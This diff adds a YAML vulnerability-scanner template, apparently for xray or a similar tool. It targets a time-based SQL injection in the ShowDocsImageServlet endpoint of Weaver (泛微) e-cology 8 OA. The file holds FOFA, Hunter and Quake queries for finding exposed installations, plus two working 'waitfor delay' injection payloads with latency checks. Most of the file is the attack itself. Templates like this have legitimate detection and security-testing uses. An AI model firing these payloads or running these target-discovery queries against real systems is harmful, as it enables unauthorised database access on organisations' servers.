@@ -1,0 +1,42 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="泛微-协同商务系统" && "ecology8"
+    hunter-query: app.name="泛微 e-cology OA" and web.body="口令"
+    quake-query: app:"泛微 e-Cology协同商务系统" and body:"系统默认"
+    zoomeye-query:   # 纯rz body 都没有 指纹模块 只有title
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-fanwei-ecology8-ShowDocsImageServlet-sqli
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+waitfor+delay+%270:0:2%27
+      follow_redirects: false
+      headers:
+    expression: response.status == 200 && response.latency >= 2000 
+    output:
+      search: |-
+        "(?P<data>2[\\d]{7})".bsubmatch(response.body)
+      data: search["data"]
+      search1: |-
+        "(?P<filename>UNIS.*?txt)".bsubmatch(response.body)
+      filename: search1["filename"]
+  r1:
+    request:
+      method: GET
+      path: /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+waitfor+delay+%270:0:4%27
+      follow_redirects: false
+      headers:
+    expression: response.status == 200 && response.latency >= 4000 
+expression: r0() && r1()
